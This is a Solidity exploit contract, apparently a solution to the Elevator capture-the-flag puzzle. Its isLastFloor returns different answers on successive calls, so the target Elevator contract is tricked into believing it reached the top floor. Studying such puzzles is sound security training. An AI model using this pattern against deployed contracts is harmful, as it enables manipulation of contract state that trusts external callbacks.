// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorHelper is Building {
  bool firstCall = true;
  function isLastFloor(uint floor) external override returns (bool) {
    if(firstCall) {
        firstCall = false;
        return false;
    }
    return true;
  }

  function exec(address elevatorAddr) public {
      // Why call will cause internal tx reverted??
    //   elevatorAddr.call(abi.encodeWithSignature("goTo(uint)", 1));
    Elevator(elevatorAddr).goTo(1);
  }
}